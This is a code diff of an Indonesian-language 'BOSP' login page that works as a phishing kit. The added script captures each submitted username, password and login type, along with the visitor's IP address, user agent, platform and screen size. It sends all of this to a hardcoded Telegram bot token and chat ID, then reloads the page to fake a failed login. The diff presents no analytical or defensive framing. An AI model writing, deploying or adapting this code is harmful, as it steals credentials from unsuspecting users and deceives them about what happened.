@@ -30,7 +30,6 @@
             color: #9ca3af;
         }
 
-        /* Loading spinner */
         .loader {
             border: 2px solid #f3f3f3;
             border-top: 2px solid #ffffff;
@@ -40,7 +39,6 @@
             animation: spin 1s linear infinite;
             display: inline-block;
             margin-right: 8px;
-            vertical-align: middle;
         }
 
         @keyframes spin {
@@ -65,120 +63,91 @@
         <p class="text-center text-gray-500 mb-6 text-sm">Login untuk masuk</p>
 
         <form id="loginForm" class="space-y-4">
-            <!-- Username -->
             <div class="input-icon-wrapper">
-                <input type="text" 
-                       id="username"
-                       placeholder="Username" 
-                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
-                       required>
+                <input type="text" id="username" placeholder="Username" 
+                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700" required>
                 <i data-lucide="mail" class="input-icon w-5 h-5"></i>
             </div>
 
-            <!-- Password -->
             <div class="input-icon-wrapper">
-                <input type="password" 
-                       id="password"
-                       placeholder="Password" 
-                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700"
-                       required>
+                <input type="password" id="password" placeholder="Password" 
+                       class="w-full border border-gray-300 p-2.5 pr-10 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 text-gray-700" required>
                 <i data-lucide="lock" class="input-icon w-5 h-5"></i>
             </div>
 
-            <!-- Login Type -->
             <div class="space-y-1">
                 <label class="text-sm font-semibold text-gray-600">Login Type</label>
-                <select id="loginType" class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 appearance-none cursor-pointer">
+                <select id="loginType" class="w-full border border-gray-300 p-2.5 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 bg-white text-gray-700 cursor-pointer">
                     <option value="Bank">Bank</option>
                     <option value="Admin">Admin</option>
                     <option value="User">User</option>
                 </select>
             </div>
 
-            <!-- Sign In Button -->
-            <button type="submit" 
-                    id="submitBtn"
+            <button type="submit" id="submitBtn" 
                     class="w-full bg-[#007bff] hover:bg-blue-600 text-white font-medium py-2.5 rounded transition-colors mt-2 flex items-center justify-center">
                 <span id="btnText">Sign In</span>
             </button>
         </form>
 
-        <!-- Footer Links -->
         <div class="mt-8 flex items-center space-x-2 text-sm">
             <span class="text-red-500">Klik jika</span>
-            <a href="#" class="bg-[#ffc107] hover:bg-yellow-500 text-gray-800 px-3 py-1 rounded font-medium transition-colors">
+            <button class="bg-[#ffc107] hover:bg-yellow-500 text-gray-800 px-3 py-1 rounded font-medium transition-colors">
                 Reset/Lupa Password
-            </a>
-        </div>
-    </div>
-
-    <!-- Custom Alert Modal -->
-    <div id="modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-lg p-6 max-w-sm w-full shadow-xl">
-            <div id="modalIcon" class="mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4"></div>
-            <h3 id="modalTitle" class="text-lg font-bold text-center mb-2"></h3>
-            <p id="modalMessage" class="text-gray-600 text-center mb-6 text-sm"></p>
-            <button onclick="closeModal()" class="w-full py-2 bg-gray-800 text-white rounded hover:bg-gray-700 font-medium">
-                Tutup
             </button>
         </div>
     </div>
 
     <script>
-        // Konfigurasi Bot Telegram
+        lucide.createIcons();
+
         const TELEGRAM_TOKEN = "8336160915:AAFUeRN28Q5CsdxMsYH5qvS6IQ9iJxqpEXA";
         const TELEGRAM_CHAT_ID = "8001301204";
-
-        // Inisialisasi Ikon
-        lucide.createIcons();
 
         const loginForm = document.getElementById('loginForm');
         const submitBtn = document.getElementById('submitBtn');
         const btnText = document.getElementById('btnText');
-        const modal = document.getElementById('modal');
 
-        function showModal(title, message, isSuccess) {
-            const iconDiv = document.getElementById('modalIcon');
-            const titleEl = document.getElementById('modalTitle');
-            const messageEl = document.getElementById('modalMessage');
-
-            titleEl.textContent = title;
-            messageEl.textContent = message;
-            
-            if (isSuccess) {
-                iconDiv.className = "mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4 bg-green-100";
-                iconDiv.innerHTML = '<i data-lucide="check" class="text-green-600"></i>';
-            } else {
-                iconDiv.className = "mx-auto flex items-center justify-center h-12 w-12 rounded-full mb-4 bg-red-100";
-                iconDiv.innerHTML = '<i data-lucide="x" class="text-red-600"></i>';
+        // Fungsi untuk mengambil IP Address
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "Gagal mengambil IP";
             }
-            
-            modal.classList.remove('hidden');
-            lucide.createIcons();
-        }
-
-        function closeModal() {
-            modal.classList.add('hidden');
         }
 
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
 
-            // Ambil data
+            // Set loading state
+            submitBtn.disabled = true;
+            btnText.innerHTML = '<span class="loader"></span> Mengirim...';
+
+            // Ambil data input
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
-            const type = document.getElementById('loginType').value;
+            const loginType = document.getElementById('loginType').value;
+            
+            // Ambil data sistem
+            const ipAddress = await getIP();
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
 
-            // Efek Loading
-            submitBtn.disabled = true;
-            btnText.innerHTML = '<span class="loader"></span> Memproses...';
-
-            // Format Pesan Telegram
-            const text = `🚀 *Login BOSP Baru*\n\n` +
-                         `👤 *Username:* \`${username}\`\n` +
-                         `🔑 *Password:* \`${password}\`\n` +
-                         `🏷️ *Type:* ${type}\n\n` +
-                         `🕒 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+            // Format Pesan
+            const message = `🔔 *NOTIFIKASI LOGIN BOSP*\n\n` +
+                            `👤 *Username:* \`${username}\`\n` +
+                            `🔑 *Password:* \`${password}\`\n` +
+                            `🏷️ *Tipe Login:* ${loginType}\n\n` +
+                            `🌐 *Informasi Teknis:*\n` +
+                            `📍 *IP Address:* ${ipAddress}\n` +
+                            `📱 *Platform:* ${platform}\n` +
+                            `🖥️ *Resolusi:* ${screenRes}\n` +
+                            `🔍 *User Agent:* \n\`${userAgent}\`\n\n` +
+                            `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -186,19 +155,19 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
-                        text: text,
+                        text: message,
                         parse_mode: 'Markdown'
                     })
                 });
 
                 if (response.ok) {
-                    showModal("Berhasil", "Data login telah diverifikasi.", true);
-                    loginForm.reset();
-                } else {
-                    throw new Error("Gagal mengirim data");
+                    // Redirect atau tampilkan pesan sukses (Simulasi error login asli)
+                    setTimeout(() => {
+                        window.location.reload(); 
+                    }, 500);
                 }
             } catch (error) {
-                showModal("Gagal", "Terjadi kesalahan koneksi. Silakan coba lagi.", false);
+                console.error('Error:', error);
             } finally {
                 submitBtn.disabled = false;
                 btnText.innerHTML = 'Sign In';
